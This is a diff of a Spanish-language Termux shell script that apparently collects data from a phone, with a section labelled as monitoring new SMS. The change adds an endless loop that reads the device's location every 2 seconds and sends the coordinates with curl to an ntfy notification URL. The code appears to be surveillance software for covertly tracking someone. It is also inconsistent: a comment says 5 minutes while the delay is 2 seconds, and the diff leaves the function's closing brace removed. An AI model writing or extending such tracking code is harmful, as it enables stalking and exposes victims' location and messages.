@@ -59,14 +59,18 @@ recopilar_datos() {
         done
     fi
 
-    # 5. Ubicación
-    ubicacion=$(termux-location -p gps -r once 2>/dev/null)
-    if [ -n "$ubicacion" ]; then
-        LAT=$(echo "$ubicacion" | jq -r '.latitude')
-        LON=$(echo "$ubicacion" | jq -r '.longitude')
-        enviar_ntfy "📍 Ubicación: Latitud $LAT, Longitud $LON"
+
+while true; do
+    LOC=$(termux-location -p network 2>/dev/null)
+    if [ -n "$LOC" ]; then
+        LAT=$(echo "$LOC" | jq -r '.latitude')
+        LON=$(echo "$LOC" | jq -r '.longitude')
+        curl -s -d "Ubicación actual: $LAT,$LON" "$NTFY_URL"
+    else
+        curl -s -d "No se pudo obtener ubicación" "$NTFY_URL"
     fi
-}
+    sleep 2  # 5 minutos
+done
 
 # === MONITOREO DE NUEVOS SMS ===
 monitor_sms() {
